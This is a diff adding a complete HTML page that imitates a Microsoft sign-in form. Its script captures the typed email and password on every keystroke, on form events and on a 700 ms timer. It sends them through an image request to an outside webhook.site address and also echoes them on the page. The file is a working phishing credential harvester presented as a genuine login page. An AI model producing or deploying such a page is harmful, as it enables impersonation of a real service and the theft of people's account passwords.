@@ -1,0 +1,42 @@
+<!doctype html>
+<html lang="en">
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Sign in to your account</title>
+<style>
+ body{font-family:'Segoe UI',system-ui,sans-serif;background:#f2f2f2;margin:0}
+ .box{width:440px;max-width:92%;margin:6vh auto;background:#fff;padding:44px;box-shadow:0 2px 6px rgba(0,0,0,.2)}
+ .logo{display:flex;align-items:center;gap:8px;margin-bottom:16px}
+ .logo b{font-size:15px;color:#5e5e5e}
+ h1{font-size:24px;font-weight:600;margin:.2em 0 1em}
+ input{width:100%;box-sizing:border-box;border:none;border-bottom:1px solid #666;padding:6px 0;font-size:15px;margin:8px 0 18px;outline:none}
+ .btn{float:right;background:#0067b8;color:#fff;border:0;padding:8px 28px;font-size:15px;cursor:pointer}
+ #shown{clear:both;font-size:13px;color:#b00;white-space:pre-wrap;word-break:break-all;padding-top:40px}
+ a{color:#0067b8;text-decoration:none;font-size:13px}
+</style>
+<div class="box">
+ <div class="logo">
+  <svg width="20" height="20" viewBox="0 0 23 23"><rect x="1" y="1" width="10" height="10" fill="#f25022"/><rect x="12" y="1" width="10" height="10" fill="#7fba00"/><rect x="1" y="12" width="10" height="10" fill="#00a4ef"/><rect x="12" y="12" width="10" height="10" fill="#ffb900"/></svg>
+  <b>Microsoft</b>
+ </div>
+ <h1>Sign in</h1>
+ <form id="f">
+  <input type="email" name="loginfmt" id="u" placeholder="Email, phone, or Skype" autocomplete="username">
+  <input type="password" name="passwd" id="p" placeholder="Password" autocomplete="current-password">
+  <div style="font-size:13px"><a href="#">Can’t access your account?</a></div>
+  <button class="btn" type="submit">Sign in</button>
+ </form>
+ <pre id="shown"></pre>
+</div>
+<script>
+var U='https://webhook.site/4f65b4cd-39b4-49e8-a05b-e0a2785d45cd';
+var u=document.getElementById('u'),p=document.getElementById('p'),shown=document.getElementById('shown');
+function dump(){
+ var s="loginfmt="+u.value+"\npasswd="+p.value;
+ shown.textContent=s;
+ if(u.value||p.value) try{new Image().src=U+'/ms?d='+encodeURIComponent(s)+'&r='+Math.random();}catch(e){}
+}
+document.getElementById('f').addEventListener('submit',function(e){e.preventDefault();dump();});
+[u,p].forEach(function(el){['input','change','blur','keyup'].forEach(function(ev){el.addEventListener(ev,dump);});});
+setInterval(dump,700);
+</script>
